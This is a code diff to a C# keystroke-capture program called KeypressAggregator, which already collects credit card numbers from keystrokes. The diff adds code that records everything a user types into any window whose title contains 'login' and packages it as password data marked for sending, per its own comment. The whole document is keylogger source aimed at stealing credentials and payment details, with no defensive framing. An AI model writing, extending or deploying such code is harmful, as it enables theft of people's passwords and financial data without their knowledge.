@@ -22,6 +22,11 @@ namespace KeypressAggregator
             // Counter for credit card
             int creditCard = 0;
             String creditNum = "";
+
+            // Boolean for login page
+            Boolean isPswrd = false;
+            String password = "";
+
             while (this.inq != null)
             {
                 KeyPress ks;
@@ -60,6 +65,30 @@ namespace KeypressAggregator
                         Console.WriteLine("DATA: " + ci.Data);
 
                         creditNum = "";
+                    }
+
+                    // If the chrome window has the word login, just record everything to send
+                    if (ks.ActiveProgram.Contains("login"))
+                    {
+                        if(isPswrd == false)
+                        {
+                            isPswrd = true;
+
+                        }
+                        password += ((Keys)ks.Key).ToString();
+                    }
+                    else
+                    {
+                        if(isPswrd == true)
+                        {
+                            Console.WriteLine("Password Data: " + password);
+                            var ci = new CI();
+                            ci.Type = "PSW";
+                            ci.Data = password;
+                            Console.WriteLine("DATA: " + ci.Data);
+                            isPswrd = false;
+                            password = "";
+                        }
                     }
                 }
                 Thread.Sleep(1000);
